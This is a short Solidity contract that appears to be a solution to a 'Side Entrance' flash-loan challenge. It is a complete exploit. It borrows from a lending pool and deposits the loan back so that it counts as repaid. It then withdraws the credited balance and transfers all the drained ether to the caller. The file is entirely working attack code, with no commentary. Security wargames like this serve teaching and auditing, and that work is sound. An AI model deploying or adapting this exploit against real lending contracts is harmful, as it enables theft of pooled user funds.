// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface SideEntrance {
    function flashLoan(uint256 amount) external;
    function withdraw() external;
    function deposit() external payable;
}

contract SideEntranceAttacker {
    address pool;
    constructor (address poolAddress){
        pool = poolAddress;
    }

    function execute() external payable{
        SideEntrance(pool).deposit{value: msg.value}();
    }

    function drainPool(uint256 amount) external {
        SideEntrance(pool).flashLoan(amount);
        SideEntrance(pool).withdraw();
        address payable sender = payable(msg.sender);

        sender.transfer(address(this).balance);

    }

    receive() external payable {}
}